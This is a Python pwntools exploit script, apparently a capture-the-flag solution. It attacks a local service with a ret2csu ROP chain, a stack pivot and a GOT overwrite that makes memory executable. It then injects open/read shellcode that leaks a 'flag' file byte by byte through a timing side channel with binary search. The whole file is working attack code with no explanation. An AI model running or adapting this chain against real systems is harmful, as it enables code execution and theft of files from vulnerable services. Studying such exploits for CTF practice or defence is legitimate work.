#!/usr/bin/env python3
import time
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'error'

def is_greater_than(pos, ch):
    try:
        r = remote('127.0.0.1', 20000)

        buf = 0x601100
        read_got = 0x601048
        alarm_got = 0x601040

        # gadgets
        leave = 0x4009c6

        '''
        mov    rdx,r13
        mov    rsi,r14
        mov    edi,r15d
        call   QWORD PTR [r12+rbx*8]
        add    rbx,0x1
        cmp    rbx,rbp
        jne    400a30 <__libc_start_main@plt+0x2f0>
        add    rsp,0x8
        ...csu2
        '''
        csu1 = 0x400a30

        '''
        pop    rbx
        pop    rbp
        pop    r12
        pop    r13
        pop    r14
        pop    r15
        '''
        csu2 = 0x400a4a

        rop = flat(
            csu2,
            0,          # rbx
            1,          # rbp
            read_got,   # r12
            0x300,      # r13
            buf,        # r14
            0,          # r15
            csu1,
            *([0] * 2),
            buf,        # rbp
            *([0] * 4),
            leave
        )
        r.send((b'A' * 40 + rop).ljust(0x100, b'\x00'))

        rop = flat(
            0,             # new rbp
            
            csu2,
            0,             # rbx
            1,             # rbp
            read_got,      # r12
            10,            # r13
            alarm_got - 9, # r14
            0,             # r15
            csu1,
            0,
            
            0,             # rbx
            1,             # rbp
            alarm_got,     # r12
            7,             # r13
            0x1000,        # r14
            0x601000,      # r15
            csu1,
            *([0] * 7),
            buf + 8 * (25 + 1)
        )

        assembly = asm('''
        data:
            .ascii "flag\\x00\\x00\\x00\\x00"
        open:
            mov rax, 2
            mov rdi, {}
            mov rsi, 0
            mov rdx, 0
            syscall
        read:
            mov rdi, rax
            mov rax, 0
            mov rsi, 0x601f00
            mov rdx, 100
            syscall
        compare:
            mov al, BYTE PTR ds:{}
            cmp al, {}
            jg good
            jmp bad
        good:
            jmp good
        bad:
        '''.format(buf + 8 * 25, hex(0x601f00 + pos), ch))

        r.send((rop + assembly).ljust(0x300, b'\x00'))
        r.send(b'\x05' * 10)

        r.recvline(timeout = 0.1)
        r.close()
        return True

    except EOFError:
        r.close()
        return False

flag = b''
pos = 0
while True:
    L = 0
    H = 255
    while True:
        M = (L + H) // 2
        if is_greater_than(pos, M):
            L = M + 1
        else:
            H = M
        if L == H:
            flag += bytes([L])
            break
    print(flag)
    if flag[-1] == 0:
        break
    pos += 1
